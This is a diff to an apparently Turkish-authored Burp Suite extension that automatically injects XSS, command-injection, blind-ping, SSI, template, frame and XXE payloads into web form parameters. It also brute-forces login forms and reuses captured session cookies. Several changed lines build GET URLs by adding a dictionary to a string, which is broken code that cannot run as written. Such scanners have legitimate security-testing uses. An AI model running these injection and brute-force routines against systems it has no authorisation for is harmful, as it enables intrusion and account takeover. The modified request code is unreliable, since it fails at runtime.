                                 postgetdict=params.copy()
                                 data = dump.dump_all(y11)
                                 rawdata = data.decode('utf-8')
 
                             if "12345669" in y11.text or "16773409" in y11.text or "Roaming" in y11.text :
-                                self.ekle(method,url,"Command injection",parametresaf, rawdata)
+                                self.ekle(method,url,"Command injection",str(new_param), rawdata)
 
                         except:
                             mesaj="ddd"
@@ -2399,38 +1948,53 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 if key in postgetdict:
                     postgetdict={}
                     postgetdict[key]=value+xssler
+                    new_param = {}
+                    new_param = postgetdict.copy()
                     try:
-                        parametresaf = urllib.urlencode(postgetdict)
                         if method=="GET":
-                            xsspostresponse = session.get(url+"?"+parametresaf)
+                            xsspostresponse = session.get(url+"?"+postgetdict)
                             postgetdict.clear()
                             postgetdict=params.copy()
                             data = dump.dump_all(xsspostresponse)
                             rawdata = data.decode('utf-8')
 
                         else:
-                            xsspostresponse = session.post(url, parametresaf).text
+
+                            xsspostresponse = session.post(url, postgetdict)
+
                             postgetdict.clear()
                             postgetdict=params.copy()
                             data = dump.dump_all(xsspostresponse)
                             rawdata = data.decode('utf-8')
 
-                        if "<script>alert(0x000123)" in xsspostresponse.text or \
-                                                   "');alert(0x000123)" in xsspostresponse.text or \
-                           "<sCriPt>alert(0x000123)" in xsspostresponse.text or \
-                           "+alert(0x000123)+" in xsspostresponse.text or \
-                           "'%2Balert(0x000123)%2B'" in xsspostresponse.text or \
-                           "<BODY ONLOAD=alert(0x000123)>" in xsspostresponse.text or \
-                      "<img Src=0x94 onerror=alert(0x000123)" in xsspostresponse.text:
+                        if "<script>alert(0x000123)" in xsspostresponse.text \
+                                or "');alert(0x000123)" in xsspostresponse.text \
+                                or "<sCriPt>alert(0x000123)" in xsspostresponse.text \
+                                or "+alert(0x000123)+" in xsspostresponse.text \
+                                or "'%2Balert(0x000123)%2B'" in xsspostresponse.text \
+                                or "<BODY ONLOAD=alert(0x000123)>" in xsspostresponse.text \
+                                or "<img Src=0x94 onerror=alert(0x000123)" in xsspostresponse.text:
+
+
                             xssmi=self.xsscalisiomu(xsspostresponse.text)
                             if xssmi==False:
-                                self.ekle(method,url,"XSS",parametresaf, rawdata)
+                                self.ekle(method,url,"XSS",str(new_param), rawdata)
 
+                    except requests.exceptions.HTTPError as errh:
+                        print ("Http Error:", errh)
+                    except requests.exceptions.ConnectionError as errc:
+                        print ("Error Connecting:", errc)
+                    except requests.exceptions.Timeout as errt:
+                        print (errt.message)
+                    except requests.exceptions.RequestException as err:
+                        print ("OOps: Something Else", err)
                     except:
                         mesaj="dd"
-                    self.hatakontrol(url, rawdata, url + " XSS")
+
+                    self.hatakontrol(method,url, rawdata, url + " XSS")
                     postgetdict.clear()
                     postgetdict = params.copy()
+
 
 
 
@@ -2442,15 +2006,15 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         for key,value in params.items():
             if key in postgetdict:
                 postgetdict[key]=value+kodum
-
+                new_param = {}
+                new_param = postgetdict.copy()
         try:
-            parametresaf = urllib.urlencode(postgetdict)
             if method=="GET":
-                ssisource = session.get(url+"?"+parametresaf)
+                ssisource = session.get(url+"?"+postgetdict)
                 data = dump.dump_all(ssisource)
                 rawdata = data.decode('utf-8')
             else:
-                ssisource = session.post(url, parametresaf)
+                ssisource = session.post(url, postgetdict)
                 data = dump.dump_all(ssisource)
                 rawdata = data.decode('utf-8')
 
@@ -2459,7 +2023,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                "DATE_GMT" in ssisource.text and \
                "DOCUMENT_URI" in ssisource.text and \
                "LAST_MODIFIED" in ssisource.text:
-                self.ekle(method,url,"SSI Injection",parametresaf, rawdata)
+                self.ekle(method,url,"SSI Injection",str(new_param), rawdata)
         except:
             mesaj="fff"
             #yaz(mesaj)
@@ -2484,24 +2048,25 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 for key,value in params.items():
                     if key in postgetdict:
                         postgetdict[key]=value+sep+asilblind
+                        new_param = {}
+                        new_param = postgetdict.copy()
 
                 try:
-                    parametresaf = urllib.urlencode(postgetdict)
                     if method=="GET":
-                        blindcmdsource = session.get(url+"?"+parametresaf,timeout=29)
+                        blindcmdsource = session.get(url+"?"+postgetdict,timeout=29)
                         postgetdict.clear()
                         postgetdict=params.copy()
                         data = dump.dump_all(blindcmdsource)
                         rawdata = data.decode('utf-8')
                     else:
-                        blindcmdsource = session.post(url, parametresaf,timeout=20).text
+                        blindcmdsource = session.post(url, postgetdict,timeout=20).text
                         postgetdict.clear()
                         postgetdict=params.copy()
                         data = dump.dump_all(blindcmdsource)
                         rawdata = data.decode('utf-8')
 
                 except socket.timeout:
-                    self.ekle(method,url,"Blind Command Injection",parametresaf, "ping -c 50 Timeout \n"+rawdata)
+                    self.ekle(method,url,"Blind Command Injection",str(new_param), "ping -c 50 Timeout \n"+rawdata)
 
 
                 except:
@@ -2599,26 +2164,27 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 if key in postgetdict:
                     postgetdict={}
                     postgetdict[key]=value+rcefull
+                    new_param = {}
+                    new_param = postgetdict.copy()
                     try:
-                        parametresaf = urllib.urlencode(postgetdict)
                         if method=="GET":
-                            y11 = session.get(url+"?"+parametresaf)
+                            y11 = session.get(url+"?"+postgetdict)
                             postgetdict.clear()
                             postgetdict=params.copy()
                             data = dump.dump_all(y11)
                             rawdata = data.decode('utf-8')
                             if "167734101" in y11.text:
-                                self.ekle(method,url,"Remote Command Injection",parametresaf, rawdata)
+                                self.ekle(method,url,"Remote Command Injection",str(new_param), rawdata)
 
 
                         else:
-                            y11 = session.post(url, parametresaf)
+                            y11 = session.post(url, postgetdict)
                             postgetdict.clear()
                             postgetdict=params.copy()
                             data = dump.dump_all(y11)
                             rawdata = data.decode('utf-8')
                             if "167734101" in y11.text:
-                                self.ekle(method,url,"Remote Command Injection",parametresaf, rawdata)
+                                self.ekle(method,url,"Remote Command Injection",str(new_param), rawdata)
 
                     except:
                         mesaj="eee"
@@ -2627,7 +2193,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                     postgetdict = params.copy()
 
     def frameinjection(self,url,params,method):
-
 
 
 
@@ -2643,35 +2208,39 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 if key in postgetdict:
                     postgetdict={}
                     postgetdict[key]=value+framefull
+                    new_param={}
+                    new_param=postgetdict.copy()
                     try:
-                        parametresaf = urllib.urlencode(postgetdict)
+                        
                         if method=="GET":
-                            y11 = session.get(url+"?"+parametresaf)
+                            y11 = session.get(url+"?"+postgetdict)
                             postgetdict.clear()
                             postgetdict=params.copy()
                             data = dump.dump_all(y11)
                             rawdata = data.decode('utf-8')
-                            if "readme.md" in y11.text.lower():
-                                if "readme.md%3E%3C%2Fiframe%3E" not in y11.text.lower():
-                                    self.ekle(method,url,"Frame Injection",parametresaf, rawdata)
+                            if "README.md" in y11.text:
+                                if "readme.md%3E%3C%2Fiframe%3E" not in y11.text:
+                                    self.ekle(method,url,"Frame Injection",str(new_param), rawdata)
 
 
 
                         else:
-                            y11 = session.post(url, parametresaf)
+
+                            y11 = session.post(url, postgetdict)
+
                             postgetdict.clear()
                             postgetdict=params.copy()
                             data = dump.dump_all(y11)
                             rawdata = data.decode('utf-8')
-                            if "readme.md" in y11.text.lower():
-                                if "readme.md%3E%3C%2Fiframe%3E" not in y11.text.lower():
-                                    self.ekle(method,url,"Frame Injection",parametresaf, rawdata)
+                            if "README.md" in y11.text:
+                                if "readme.md%3E%3C%2Fiframe%3E" not in y11.text:
+                                    self.ekle(method,url,"Frame Injection",str(new_param), y11.text)
+
 
                     except:
                         mesaj="Bilinmeyen hata olustu\n"
                     postgetdict.clear()
                     postgetdict = params.copy()
-
 
     def templateinjection(self,url,params,method):
 
@@ -2685,16 +2254,17 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 if key in postgetdict:
                     postgetdict={}
                     postgetdict[key]=value+framefull
+                    new_param = {}
+                    new_param = postgetdict.copy()
                     try:
-                        parametresaf = urllib.urlencode(postgetdict)
                         if method=="GET":
-                            y11 = session.get(url+"?"+parametresaf)
+                            y11 = session.get(url+"?"+postgetdict)
                             postgetdict.clear()
                             postgetdict=params.copy()
                             data = dump.dump_all(y11)
                             rawdata = data.decode('utf-8')
                             if value+"289" in y11.text.lower():
-                                self.ekle(method,url,"Template Injection",parametresaf, rawdata)
+                                self.ekle(method,url,"Template Injection",str(new_param), rawdata)
 
 
 
@@ -2705,11 +2275,11 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                             data = dump.dump_all(y11)
                             rawdata = data.decode('utf-8')
                             if value+"289" in y11.text.lower():
-                                self.ekle(method,url,"Template Injection",parametresaf, rawdata)
+                                self.ekle(method,url,"Template Injection",str(new_param), rawdata)
 
 
                         if value+"0x94289" in y11.text.lower():
-                            self.ekle(method,url,"Template Injection",parametresaf, rawdata)
+                            self.ekle(method,url,"Template Injection",str(new_param), rawdata)
 
 
                     except:
@@ -2828,12 +2398,11 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                    key.lower()=="id":
                                 dictb1[key]="0x94"
 
-                    parametrebrute1 = urllib.urlencode(dictb1)
                     if method=="GET":
-                        loginnormal = self.temizle(session.get(url+"?"+parametrebrute1).text)
+                        loginnormal = session.get(url+"?"+dictb1).text
 
                     else:
-                        loginnormal = self.temizle(session.post(url, parametrebrute1).text)
+                        loginnormal = session.post(url, dictb1).text
 
 
                     for gelenuser in loginler:
@@ -2843,7 +2412,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                             for key,value in params.items():
                                 if key in dictlogin:
                                     if key.lower()=="user" or \
-                                                                           key.lower()=="usr" or \
+                                       key.lower()=="usr" or \
                                        key.lower()=="username" or \
                                        key.lower()=="userinput" or \
                                        key.lower()=="usernameinput" or \
@@ -2852,28 +2421,28 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                                         dictlogin[key]=gelenuser
 
                                     if key.lower()=="pass" or \
-                                                                           key.lower()=="password" or \
+                                       key.lower()=="password" or \
                                        key.lower()=="passwd" or \
                                        key.lower()=="passinput" or \
                                        key.lower()=="passwordinput" or \
                                        key.lower()=="pwd":
                                         dictlogin[key]=gelenpass
-
-                            loginsaf = urllib.urlencode(dictlogin)
+                            new_param = {}
+                            new_param = dictlogin.copy()
                             if method=="GET":
-                                brutekaynak = self.temizle(urllib.urlopen(url+"?"+loginsaf).read())
+                                brutekaynak = session.get(url+"?"+dictlogin).text
                                 dictlogin.clear()
                                 dictlogin=params.copy()
 
                             else:
-                                brutekaynak = self.temizle(urlopen(url, loginsaf).read())
+                                brutekaynak = session.post(url, dictlogin).text
                                 dictlogin.clear()
                                 dictlogin=params.copy()
 
 
                             if len(loginnormal)!=len(brutekaynak):
 
-                                self.ekle("LOGIN",url,"Brute Force",url+"\nLogin Data="+loginsaf, brutekaynak)
+                                self.ekle("LOGIN",url,"Brute Force",url+"\nLogin Data="+str(new_param), brutekaynak)
                 except:
                     mesaj="ddd"
                     #yaz(mesaj)
@@ -2890,7 +2459,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
             self.postget(formurl, toplamveri,"GET")
             self.postgettek(formurl, toplamveri,"GET")
-            self.blindpost(formurl,toplamveri,"GET")
+            self.blindpostonay(formurl,toplamveri,"GET")
             self.comandinj(formurl, toplamveri,"GET")
             self.loginbrute(formurl,toplamveri,"GET")
             self.postXSS(formurl, toplamveri,"GET")
@@ -2902,19 +2471,49 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             self.xxe_injection(formurl, toplamveri,"GET")
 
         else:
+            #dout.println("formyazdan data geldi")
 
             self.postget(formurl, toplamveri,"POST")
+            #dout.println("formyazdan data geldi 1")
+            
             self.postgettek(formurl, toplamveri,"POST")
-            self.blindpost(formurl, toplamveri,"POST")
+            #dout.println("formyazdan data geldi 2")
+            
+            self.blindpostonay(formurl, toplamveri,"POST")
+            #dout.println("formyazdan data geldi 3")
+            
             self.comandinj(formurl, toplamveri,"POST")
+            #dout.println("formyazdan data geldi 4")
+            
             self.loginbrute(formurl,toplamveri,"POST")
+            #dout.println("formyazdan data geldi 5")
+            
             self.postXSS(formurl, toplamveri,"POST")
+            #dout.println("formyazdan data geldi 6")
+            
             self.ssikontrol(formurl, toplamveri,"POST")
+            
+            #dout.println("formyazdan data geldi 7")
+            
             self.blindcommand(formurl, toplamveri,"POST")
+            
+            #dout.println("formyazdan data geldi 8")
+            
             self.postrce(formurl, toplamveri,"POST")
+            
+            #dout.println("formyazdan data geldi 9")
+            
             self.frameinjection(formurl, toplamveri,"POST")
+            
+            #dout.println("formyazdan data geldi 10")
+            
             self.templateinjection(formurl, toplamveri,"POST")
+            
+            #dout.println("formyazdan data geldi 11")
+            
             self.xxe_injection(formurl, toplamveri,"POST")
+            
+            #dout.println("formyazdan data geldi 12")
 
 
     def ekle(self,method,url,bug,payload,source):
@@ -2956,7 +2555,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             self.sefurl_xss(url)
             self.tumdizinlerde(url)
             self.indexoful(url)
-            self.formyaz(url)
             self.header_injection(url)
 
             if "?" in url and "=" in url:
@@ -2993,9 +2591,12 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             err="err"
 
     def starter(self,url):
-
         #threading.Thread(target = scan_starter, args = (self,url,)).start()
         start_new_thread(self.scan_starter,(url,))
+
+    def form_starter(self,url,params,method):
+        #threading.Thread(target = scan_starter, args = (self,url,)).start()
+        start_new_thread(self.tetikle,(url,params,method,))
 
 
 
@@ -3003,64 +2604,96 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
     def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
         global taranan
         global session
-        dahildegil = (".doc",".tar",".gz",".msi",".flv",".swf",".pkg",".xlsx",".js",".xml",".ico",".css",".gif",".jpg",".jar",".tif",".bmp",".war",".ear",".mpg",".wmv",".mpeg",".scm",".iso",".dmp",".dll",".cab",".so",".avi",".bin",".exe",".iso",".tar",".png",".pdf",".ps",".mp3",".zip",".rar",".gz")
-        # only process requests
-        if messageIsRequest:
-            return
-        url=self._helpers.analyzeRequest(messageInfo).getUrl()
-        path = urlparse.urlparse(url.toString()).path
-        ext = os.path.splitext(path)[1]
 
-        if ext not in dahildegil:
+        if toolFlag == 4 or toolFlag == 16 or toolFlag == 8:
 
-            #response = messageInfo.getResponse() #get Response from IHttpRequestResponse instance
-            #analyzedResponse = self._helpers.analyzeResponse(response)
-            #headerList = analyzedResponse.getHeaders() arrraydir
+            dahildegil = (".doc",".tar",".gz",".msi",".flv",".swf",".pkg",".xlsx",".js",".xml",".ico",".css",".gif",".jpg",".jar",".tif",".bmp",".war",".ear",".mpg",".wmv",".mpeg",".scm",".iso",".dmp",".dll",".cab",".so",".avi",".bin",".exe",".iso",".tar",".png",".pdf",".ps",".mp3",".zip",".rar",".gz")
+            # only process requests
+            if messageIsRequest:
+                pass
+            else:
+                url=self._helpers.analyzeRequest(messageInfo).getUrl()
+                path = urlparse.urlparse(url.toString()).path
+                ext = os.path.splitext(path)[1]
 
+                if ext not in dahildegil:
 
-
-
-            #if ext in dahildegil:
-
-            resquest = messageInfo.getRequest()
-            analyzedRequest = self._helpers.analyzeRequest(resquest)
-            request_header = analyzedRequest.getHeaders()
-
-            response = messageInfo.getResponse()  # get Response from IHttpRequestResponse instance
-            analyzedResponse = self._helpers.analyzeResponse(response)
-            headerList = analyzedResponse.getHeaders()
+                    #response = messageInfo.getResponse() #get Response from IHttpRequestResponse instance
+                    #analyzedResponse = self._helpers.analyzeResponse(response)
+                    #headerList = analyzedResponse.getHeaders() arrraydir
 
 
 
 
-             #for header in request_header:
-             #           if header.startswith("Cookie: "):
-              #              #dout.println("cookiem="+header)
-               #             splitHeader = header.split(":", 2)
-                #            headersm = {'Cookie': splitHeader[1].strip()}
-                 #           session.headers.update(headersm)
+                    #if ext in dahildegil:
+
+                    resquest = messageInfo.getRequest()
+                    analyzedRequest = self._helpers.analyzeRequest(resquest)
+                    request_header = analyzedRequest.getHeaders()
+
+                    response = messageInfo.getResponse()  # get Response from IHttpRequestResponse instance
+                    analyzedResponse = self._helpers.analyzeResponse(response)
+                    headerList = analyzedResponse.getHeaders()
+
+                    method = analyzedRequest.getMethod()
+                    #dout.println(url.toString()+" - "+method)
+                    parametredata = {}
+
+                    if method == "POST" :
+                        httpService = messageInfo.getHttpService()
+                        request = messageInfo.getRequest()
+                        analyzedRequest = self._helpers.analyzeRequest(httpService, request)
+                        body = request[analyzedRequest.getBodyOffset():].tostring()
+                        if body!="":
+                            if "&" in body:
+                                body_split=body.split("&")
+                                parametredata = {}
+                                for param in body_split:
+                                    parametredata[param.split("=")[0]] = param.split("=")[1]
+                            else:
+                                parametredata = {}
+                                parametredata[body.split("=")[0]]=body.split("=")[1]
+
+                            dout.println(url.toString() + " - " + method)
+                            dout.println(body)
+                            dout.println("------------------------------------------------------")
+
+                            self.form_starter(url.toString(),parametredata,method)
 
 
 
-            for header in request_header:
-               if header.startswith("Cookie: "):
-                    splitHeader = header.split(":", 2)
-                    headersm = {'Cookie': splitHeader[1].strip()}
-                    session.headers.update(headersm)
-               elif header.startswith("Referer: "):
-                   splitHeader2 = header.split(":", 2)
-                   headersm2 = {'Referer': splitHeader2[1].strip()}
-                   session.headers.update(headersm2)
 
 
-                    #session.headers['Cookie'] = splitHeader[1]
-                    #session.headers.update({"Cookie":header.replace(header.split(':')[0]+":","")})
 
-                    #self.table_add("XXX",url,"xx","xx","xxx")
 
-            if not taranan.has_key(url):
-                taranan[url] = "0x94"
-                self.starter(url.toString())
+                     #for header in request_header:
+                     #           if header.startswith("Cookie: "):
+                      #              #dout.println("cookiem="+header)
+                       #             splitHeader = header.split(":", 2)
+                        #            headersm = {'Cookie': splitHeader[1].strip()}
+                         #           session.headers.update(headersm)
+
+
+
+                    for header in request_header:
+                       if header.startswith("Cookie: "):
+                            splitHeader = header.split(":", 2)
+                            headersm = {'Cookie': splitHeader[1].strip()}
+                            session.headers.update(headersm)
+                       elif header.startswith("Referer: "):
+                           splitHeader2 = header.split(":", 2)
+                           headersm2 = {'Referer': splitHeader2[1].strip()}
+                           session.headers.update(headersm2)
+
+
+                            #session.headers['Cookie'] = splitHeader[1]
+                            #session.headers.update({"Cookie":header.replace(header.split(':')[0]+":","")})
+
+                            #self.table_add("XXX",url,"xx","xx","xxx")
+
+                    if not taranan.has_key(url):
+                        taranan[url] = "0x94"
+                        self.starter(url.toString())
 
         return
 
